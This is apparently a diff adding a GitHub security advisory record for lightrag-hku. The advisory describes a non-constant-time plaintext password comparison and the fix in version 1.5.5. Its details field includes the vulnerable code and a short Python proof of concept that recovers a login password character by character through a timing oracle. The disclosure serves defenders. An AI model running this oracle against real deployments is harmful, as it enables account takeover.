@@ -1,0 +1,76 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-c759-cx9p-mrwq",
+  "modified": "2026-09-22T20:40:20Z",
+  "published": "2026-09-22T20:40:19Z",
+  "aliases": [
+    "CVE-2026-85725"
+  ],
+  "summary": "lightrag-hku: Plaintext Passwords Compared Without Constant-Time Function",
+  "details": "### Summary\nWhen plaintext passwords are stored in AUTH_ACCOUNTS, the comparison uses Python's == operator which is not constant-time. An attacker with low-latency access can exploit timing differences to recover the password character by character.\n\n### Details\n\n```python\n# lightrag/api/passwords.py:13-26\ndef verify_password(plain_password: str, stored_password: str) -> bool:\n    if stored_password.startswith(\"{bcrypt}\"):\n        ...\n        return bcrypt.checkpw(...)    # constant-time  OK\n\n    return stored_password == plain_password  # NOT constant-time  VULN\n    #   Python == short-circuits on first mismatched byte\n    #   Timing leaks: password length + individual characters\n```\n\n### PoC\n\n```python\n# Timing oracle: recover password char-by-char\nimport httpx, time, string\n\nTARGET = \"http://<TARGET>:9621/login\"\nUSER   = \"admin\"\n\ndef measure(pwd: str) -> float:\n    t = time.perf_counter()\n    httpx.post(TARGET, data={\"username\": USER, \"password\": pwd})\n    return time.perf_counter() - t\n\nknown = \"\"\nfor _ in range(32):\n    best = max(string.printable,\n               key=lambda c: sum(measure(known+c+\"A\"*20) for _ in range(10)))\n    known += best\n    print(f\"Recovered: {known}\")\n```\n\n### Impact\nObservable timing discrepancy. Attackers with low-latency access can recover plaintext passwords character by character without triggering brute-force limits. Only affects deployments using unhashed passwords in AUTH_ACCOUNTS.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "lightrag-hku"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.5.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 1.5.4"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/HKUDS/LightRAG/security/advisories/GHSA-c759-cx9p-mrwq"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-85725"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HKUDS/LightRAG/pull/3423"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HKUDS/LightRAG/commit/89849c3ed0e0380345a6b5bade027cfb9a5bf32c"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/HKUDS/LightRAG"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HKUDS/LightRAG/releases/tag/v1.5.5"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-208"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-09-22T20:40:19Z",
+    "nvd_published_at": "2026-09-22T17:17:27Z"
+  }
+}
